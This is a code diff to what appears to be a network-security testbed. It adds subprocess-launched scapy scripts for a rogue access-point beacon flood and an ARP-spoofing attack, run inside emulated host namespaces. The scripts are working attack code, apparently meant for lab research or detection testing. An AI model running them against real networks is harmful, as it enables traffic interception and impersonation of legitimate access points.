@@ -3,6 +3,8 @@
 from __future__ import annotations
 
 import logging
+import subprocess
+import sys
 import threading
 import time
 from abc import ABC, abstractmethod
@@ -36,10 +38,13 @@ class BaseAttack(ABC):
         self,
         iface: str,
         on_event: Optional[Callable[[AttackEvent], None]] = None,
+        host: Optional[object] = None,
     ) -> None:
         self.iface = iface
         self._on_event = on_event
+        self.host = host
         self._thread: Optional[threading.Thread] = None
+        self._proc: Optional[subprocess.Popen] = None
         self._stop_evt = threading.Event()
         self.started_at: Optional[float] = None
         self.stopped_at: Optional[float] = None
@@ -54,18 +59,28 @@ class BaseAttack(ABC):
             return
         self._rate_pps = max(1, int(rate_pps))
         self._stop_evt.clear()
-        self._thread = threading.Thread(
-            target=self._loop, name=f"{self.attack_type}-loop", daemon=True
-        )
         self.started_at = time.time()
         self._emit("start")
-        self._thread.start()
+        if self.host is not None:
+            self._start_in_host_namespace()
+        else:
+            self._thread = threading.Thread(
+                target=self._loop, name=f"{self.attack_type}-loop", daemon=True
+            )
+            self._thread.start()
         log.info("%s started @ %d pps on %s", self.attack_type, self._rate_pps, self.iface)
 
     def stop(self) -> None:
         if not self.is_running():
             return
         self._stop_evt.set()
+        if self._proc is not None:
+            self._proc.terminate()
+            try:
+                self._proc.wait(timeout=3.0)
+            except subprocess.TimeoutExpired:
+                self._proc.kill()
+            self._proc = None
         if self._thread is not None:
             self._thread.join(timeout=3.0)
         self.stopped_at = time.time()
@@ -73,7 +88,18 @@ class BaseAttack(ABC):
         log.info("%s stopped.", self.attack_type)
 
     def is_running(self) -> bool:
-        return self._thread is not None and self._thread.is_alive()
+        thread_running = self._thread is not None and self._thread.is_alive()
+        proc_running = self._proc is not None and self._proc.poll() is None
+        return thread_running or proc_running
+
+    def _start_in_host_namespace(self) -> None:
+        script = self._host_script()
+        assert self.host is not None
+        self._proc = self.host.popen(
+            [sys.executable, "-c", script],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
 
     def _emit(self, action: str, **meta) -> None:
         if self._on_event is None:
@@ -93,6 +119,10 @@ class BaseAttack(ABC):
     def _loop(self) -> None:
         raise NotImplementedError
 
+    @abstractmethod
+    def _host_script(self) -> str:
+        raise NotImplementedError
+
 
 class RogueAPAttack(BaseAttack):
 
@@ -102,8 +132,9 @@ class RogueAPAttack(BaseAttack):
         ssid: str = CFG.attack.rogue_ssid,
         bssid: str = "de:ad:be:ef:00:01",
         on_event: Optional[Callable[[AttackEvent], None]] = None,
+        host: Optional[object] = None,
     ) -> None:
-        super().__init__(iface=iface, on_event=on_event)
+        super().__init__(iface=iface, on_event=on_event, host=host)
         self.ssid = ssid
         self.bssid = bssid
 
@@ -130,6 +161,27 @@ class RogueAPAttack(BaseAttack):
                 break
             self._stop_evt.wait(interval)
 
+    def _host_script(self) -> str:
+        return f"""
+import time
+from scapy.all import Ether, sendp
+from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt
+iface = {self.iface!r}
+rate_pps = {int(self._rate_pps)!r}
+ssid = {self.ssid!r}
+bssid = {self.bssid!r}
+interval = 1.0 / float(max(1, rate_pps))
+frame = (
+    Ether(src=bssid, dst="ff:ff:ff:ff:ff:ff")
+    / Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid)
+    / Dot11Beacon(cap="ESS")
+    / Dot11Elt(ID="SSID", info=ssid.encode())
+)
+while True:
+    sendp(frame, iface=iface, verbose=False)
+    time.sleep(interval)
+"""
+
 
 class ARPSpoofAttack(BaseAttack):
 
@@ -140,8 +192,9 @@ class ARPSpoofAttack(BaseAttack):
         target_ip: str = CFG.attack.arp_spoof_target_ip,
         victim_ip: str = "10.0.0.2",
         on_event: Optional[Callable[[AttackEvent], None]] = None,
+        host: Optional[object] = None,
     ) -> None:
-        super().__init__(iface=iface, on_event=on_event)
+        super().__init__(iface=iface, on_event=on_event, host=host)
         self.attacker_mac = attacker_mac
         self.target_ip = target_ip
         self.victim_ip = victim_ip
@@ -168,6 +221,28 @@ class ARPSpoofAttack(BaseAttack):
                 log.exception("ARPSpoofAttack send failed.")
                 break
             self._stop_evt.wait(interval)
+
+    def _host_script(self) -> str:
+        return f"""
+import time
+from scapy.all import ARP, Ether, sendp
+iface = {self.iface!r}
+rate_pps = {int(self._rate_pps)!r}
+attacker_mac = {self.attacker_mac!r}
+target_ip = {self.target_ip!r}
+victim_ip = {self.victim_ip!r}
+interval = 1.0 / float(max(1, rate_pps))
+pkt = Ether(src=attacker_mac, dst="ff:ff:ff:ff:ff:ff") / ARP(
+    op=2,
+    hwsrc=attacker_mac,
+    psrc=target_ip,
+    hwdst="ff:ff:ff:ff:ff:ff",
+    pdst=victim_ip,
+)
+while True:
+    sendp(pkt, iface=iface, verbose=False)
+    time.sleep(interval)
+"""
 
 
 class AttackEventLog:
